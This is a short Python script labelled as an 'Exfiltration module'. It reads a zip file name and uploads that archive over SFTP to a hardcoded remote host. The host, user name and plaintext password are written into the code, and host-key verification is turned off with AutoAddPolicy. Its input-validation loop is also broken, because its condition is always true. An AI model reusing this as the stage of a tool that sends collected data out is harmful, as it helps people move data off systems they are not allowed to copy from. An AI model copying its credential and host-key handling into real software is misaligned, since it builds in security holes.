


import os #to create folders
import paramiko #to create ssh connects and send files via sftp



######################## PROGRAM START ##############################################

###################### Exfiltration module ############################################################

project_path=os.path.dirname(os.path.abspath(__file__))
#db_backup_path=project_path+"/db_backup" #path for the database folder


with open("zip_name.txt",'r') as file:

    zip_name=file.read().strip()

#Sending files with SSH and FTPS

print("Extrafiltration module")

# scp_y_or_n=input("Send zip to remote server with SCP protocol ?\n").lower().strip()

scp_y_or_n='y'

stopper_2=0

while stopper_2==0:
    
    if (scp_y_or_n!='y' or scp_y_or_n!='n'):

        stopper_2=1
    
    else:
        scp_y_or_n=input("Invalid option! Try again. Do you wish to send files to a remote server? Y/N\n").strip().lower()


if scp_y_or_n=='y':
    
    #remote_host=input("Insert remote IP server adress\n")
    # pysftp
    # pip -r


    remote_host="192.168.1.97"

    remote_user="user"

    password_ssh="qwerty\\123"
  
    remote_dir="/home/user/uploads"

    # ssh_key=f"{project_path}/sshkey"

    try:

        # Create a Paramiko SSH client

        ssh_client = paramiko.SSHClient()

        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the remote server using username and password

        ssh_client.connect(remote_host, username=remote_user, password=password_ssh)

        # Create an SFTP client

        sftp_client = ssh_client.open_sftp()

        # Upload the file to the remote server

        sftp_client.put(f"{project_path}/{zip_name}", f"{remote_dir}/{zip_name}")

         # Close the SFTP and SSH clients

        sftp_client.close()

        ssh_client.close()

        print("File transferred successfully.")

    except paramiko.SSHException as e:

        print(f"Error occurred during transfer: {e}")

    
    
    # scp_send=f"scp -p {p}/{zip_name} user1@{receiver_IP}:{remote_dir}"

else:

    print("Skipping remote file delivery ...")   














    

